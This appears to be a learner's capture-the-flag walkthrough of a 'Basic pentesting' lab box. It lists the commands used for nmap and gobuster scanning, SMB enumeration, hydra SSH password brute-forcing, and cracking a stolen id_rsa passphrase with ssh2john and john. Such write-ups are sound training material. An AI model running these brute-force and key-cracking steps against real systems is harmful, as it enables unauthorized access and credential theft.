Basic pentesting

what to expect from this room/box
task brute forcing 
hash cracking
service enumeration
linux enumeration

-> started manually checking the website and found a comment to check dev note

->i have started the nmap scan in mean time i will check the website
#cmd : >>>nmap -sV -oN nmap.txt 10.10.49.168


->with gobuster i found a development folder
#cmd : >>>gobuster -u http://10.10.49.168 -w /usr/share/wordlist/dist/common.txt

/development folder has dev.txt and j.txt

now from the nmap scan we found that service port 22,80,139,445,8009,8080 are running

so enumerating samba by enum4linux
#cmd : >>>enum4linux 10.10.49.168

i found smb share

and many thing 

-> smbclient
#cmd : >>>smbclient //10.10.49.168/Anonymous
we found one file download that file and view it

smbget(to donwload file)
#cmd : >>>smbget smb://10.10.49.168/Anonymous/staff.txt 
we found two user jay kay instructing to each other

now we will use hydra (it is use to bruteforce anything user,webserver which have ipaddres)
->hydra
#cmd : >>>hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.49.168 ssh -vv -I
#check for case sensitvity for fail 
 i get the password
 armando
 now ssh into it
->ssh
#cmd : >>>ssh jan@10.10.49.168

now search the file and user and user permission 

#cmd : >>>sudo -l
so it can't run sudo 
find the {[/etc/group]} which can run sudo command 
think kay can 
go to kay 
and find .ssh{{{{we can usr linpeas also}}}}
and id_rsa key

if we find the id_rsa file then we can log into ssh 
but it need passphrase to get in now to john

->now use ssh2john
#cmd : >>>pyhton ssh2john.py id_rsa >file.hash

->now find the file using locate 
#cmd : >>>locate ssh2john
if not able to find updatedb
#cmd : >>>updatedb

->ssh2john
#cmd : >>>python /usr/share/john/ssh2john.py kay_key.txt > kay_key.hash
now use john
->john
#cmd : >>>john kay_key.hash -wordlist=/usr/share/wordlist/rockyou.txt


this is the end

we learn from this box/room
basic comments in website
nmap
enum4linux
smbclient
smbget
ssh
hydra
john
